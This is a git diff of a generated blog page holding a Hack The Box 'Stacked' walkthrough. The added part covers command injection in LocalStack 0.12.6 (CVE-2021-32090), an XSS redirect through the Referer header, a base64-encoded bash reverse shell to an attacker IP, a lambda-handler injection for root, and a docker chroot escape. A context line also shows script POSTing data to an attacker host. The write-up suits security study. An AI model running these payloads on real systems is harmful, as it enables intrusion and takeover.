@@ -57,7 +57,7 @@
 <meta name="twitter:site" content="@0xZEN2" />
 <meta name="twitter:creator" content="@Yuchao" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuchao"},"dateModified":"2022-03-31T11:17:58+08:00","datePublished":"2022-03-29T11:33:00+08:00","description":"recon","headline":"htb stacked","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/htb-stacked/"},"url":"/posts/htb-stacked/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuchao"},"dateModified":"2022-03-31T20:37:59+08:00","datePublished":"2022-03-29T11:33:00+08:00","description":"recon","headline":"htb stacked","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/htb-stacked/"},"url":"/posts/htb-stacked/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
@@ -570,6 +570,30 @@
       
 
     
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
 
     
 
@@ -591,6 +615,90 @@
       
         
         
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
       
 
       
@@ -754,12 +862,12 @@
 -->
 
 <em class="timeago"
-    data-ts="1648696678"
+    data-ts="1648730279"
     
       data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll"
     
     >
-  2022-03-30
+  2022-03-31
 </em>
 
       </span>
@@ -785,8 +893,8 @@
 
 <!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="374 words">
-  <em>2 min</em> read</span>
+  title="838 words">
+  <em>4 min</em> read</span>
 
 
       <!-- page views -->
@@ -925,10 +1033,198 @@ attacker machine
 <span class="nx">req2</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://{attackerIP}:8000/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">)</span>
 <span class="nx">req2</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
 </pre></td></tr></tbody></table></code></div></div>
+<ul>
+  <li>set target to “http://mail.stacked.htb/read-mail.php?id=1”</li>
+  <li>read the mail.</li>
+  <li>find new host “s3-testing.stacked.htb”</li>
+  <li>a s3 domain.</li>
+</ul>
 
 <h2 id="localstack-vulnerability"><span class="mr-2">LocalStack vulnerability</span><a href="#localstack-vulnerability" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
 
-<h4 id="cve-2021-32090"><span class="mr-2">CVE-2021-32090</span><a href="#cve-2021-32090" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<h4 id="find-cve-2021-32090"><span class="mr-2">Find CVE-2021-32090</span><a href="#find-cve-2021-32090" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<ul>
+  <li>locatstack version v0.12.6</li>
+  <li>CVE search</li>
+  <li>CVE-2021-32090</li>
+  <li>The dashboard component of StackLift LocalStack 0.12.6 allows attackers to inject arbitrary shell commands via the functionName parameter.</li>
+</ul>
+
+<h4 id="configure-aws"><span class="mr-2">configure aws</span><a href="#configure-aws" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>apt <span class="nb">install </span>awscli
+aws configure 
+aws <span class="o">[</span><span class="nb">command</span><span class="o">]</span> <span class="o">[</span>subcommand] <span class="nt">--endpoint-url</span> http://s3-testing.stacked.htb
+</pre></td></tr></tbody></table></code></div></div>
+<ul>
+  <li>as the config said “SERVICES=serverless”
+<code class="language-plaintext highlighter-rouge">aws lambda list-functions --endpoint-url http://s3-testing.stacked.htb</code></li>
+</ul>
+
+<h4 id="create-lambdathis-box-only-has-nodejs-runtime"><span class="mr-2">Create lambda(this box only has nodejs runtime)</span><a href="#create-lambdathis-box-only-has-nodejs-runtime" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<ul>
+  <li><a href="https://aws.amazon.com/lambda/">https://aws.amazon.com/lambda/</a></li>
+  <li><a href="https://docs.aws.amazon.com/cli/latest/reference/lambda/create-function.html">https://docs.aws.amazon.com/cli/latest/reference/lambda/create-function.html</a></li>
+</ul>
+
+<p>create random lambda function</p>
+<div class="language-javascript nolineno highlighter-rouge" file="index.js"><div class="code-header">
+        <span data-label-text="index.js"><i class="far fa-file-code"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="c1">//example from official website</span>
+<span class="nx">exports</span><span class="p">.</span><span class="nx">handler</span> <span class="o">=</span> <span class="k">async</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">,</span> <span class="nx">context</span><span class="p">){</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Event: </span><span class="se">\n</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">event</span><span class="p">,</span> <span class="kc">null</span> <span class="p">,</span><span class="mi">2</span><span class="p">))</span>
+  <span class="k">return</span> <span class="nx">context</span><span class="p">.</span><span class="nx">logStreamName</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>zip index.js
+<code class="language-plaintext highlighter-rouge">zip index.zip index.js</code>
+create this function at endpoint</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>aws lambda create-function <span class="se">\</span>
+    <span class="nt">--function-name</span> <span class="s1">'a'</span> <span class="se">\</span>
+    <span class="nt">--zip-file</span> fileb://index.zip <span class="se">\</span>
+    <span class="nt">--handler</span> index.handler <span class="se">\</span>
+    <span class="nt">--role</span> localstackdonotmatter<span class="se">\</span>
+    <span class="nt">--runtime</span> nodejs10.x
+</pre></td></tr></tbody></table></code></div></div>
+<p>invoke the function</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>aws lambda <span class="nt">--endpoint</span><span class="o">=</span>http://s3-testing.stacked.htb <span class="se">\</span>
+  invoke <span class="nt">--function-name</span> a output
+</pre></td></tr></tbody></table></code></div></div>
+<p>check if it run properly
+<code class="language-plaintext highlighter-rouge">cat output</code></p>
+
+<p>PS:</p>
+<ul>
+  <li>if use python script, set “Runtime”: “python3.7”, but this machine does not have python runtime, so there would be an error.</li>
+  <li>A Lambda function can be thought of as spinning up a relatively empty container, running the function, and then tearing that container down. So it`s not properate to make a reverse shell by lambda.</li>
+</ul>
+
+<h4 id="exploit-cve-2021-32090"><span class="mr-2">Exploit CVE-2021-32090</span><a href="#exploit-cve-2021-32090" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+
+<p>The idea here is that there is a command injection in the “function name”, will be triggered when it’s displayed on the web dashboard.</p>
+<ul>
+  <li>In previous config file, we know that dashboard is at port 8080 on victim`s machine.</li>
+  <li>ref: <a href="https://blog.sonarsource.com/hack-the-stack-with-localstack">https://blog.sonarsource.com/hack-the-stack-with-localstack</a></li>
+</ul>
+
+<p>how:</p>
+<ul>
+  <li>
+    <ol>
+      <li>send user to dashboard by XSS.</li>
+    </ol>
+  </li>
+  <li>In referer header add: <script>document.location="http://127.0.0.1:8080"</script></li>
+  <li>
+    <ol>
+      <li>command inection in “function name”.</li>
+    </ol>
+  </li>
+  <li>Test simple wget command first.</li>
+</ul>
+
+<h2 id="reverse-shell"><span class="mr-2">reverse shell</span><a href="#reverse-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
+
+<h4 id="execute-shell"><span class="mr-2">execute shell</span><a href="#execute-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/{attackerIP}/{port} 0&gt;&amp;1'</span> | <span class="nb">base64</span> <span class="nt">-w</span> 0
+</pre></td></tr></tbody></table></code></div></div>
+<ul>
+  <li>add some space to avoid ‘+’ or ‘=’ sign, maybe bad character.(maybe not needed)</li>
+</ul>
+
+<p>invoke the command</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nt">--function-name</span> <span class="s1">'echo -n {base64 reverseshell} | base64 -d | bash'</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<h4 id="upgrade-shell"><span class="mr-2">upgrade shell</span><a href="#upgrade-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<div class="language-python highlighter-rouge"><div class="code-header">
+        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import pty; pty.spawn("/bin/bash")'</span>
+<span class="o">^</span><span class="n">Z</span>
+<span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span> <span class="n">fg</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<h4 id="make-the-shell-can-clear-screen"><span class="mr-2">make the shell can clear screen</span><a href="#make-the-shell-can-clear-screen" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>export TERM=xterm
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Now in the localstack container.</p>
+
+<h2 id="privesc"><span class="mr-2">privesc</span><a href="#privesc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
+
+<h4 id="pspy"><span class="mr-2">PSPY</span><a href="#pspy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<ul>
+  <li>pspy - unprivileged Linux process snooping</li>
+  <li><a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></li>
+  <li>download to victim, can not run at /dev/shm (noexec), but can run at /tmp</li>
+  <li>find that handler was run by root.</li>
+  <li>so add handler the reverse shell.
+    <div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>aws lambda create-function <span class="se">\</span>
+  <span class="nt">--function-name</span> <span class="s1">'{not this time}'</span> <span class="se">\</span>
+  <span class="nt">--zip-file</span> fileb://index.zip <span class="se">\</span>
+  <span class="nt">--handler</span> <span class="s1">'$({the reverse shell command as before})'</span> <span class="se">\</span>
+  <span class="nt">--role</span> localstackdonotmatter<span class="se">\</span>
+  <span class="nt">--runtime</span> nodejs10.x
+</pre></td></tr></tbody></table></code></div>    </div>
+  </li>
+  <li>get root of the container.</li>
+  <li>On gtfobins.io
+    <div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="c"># Shell</span>
+<span class="c"># It can be used to break out from restricted environments by spawning an interactive system shell.</span>
+<span class="c"># The resulting is a root shell.</span>
+docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span class="nt">-it</span> alpine <span class="nb">chroot</span> /mnt sh
+</pre></td></tr></tbody></table></code></div>    </div>
+    <p>then get the system root.</p>
+  </li>
+</ul>
+
 
 </div>
 
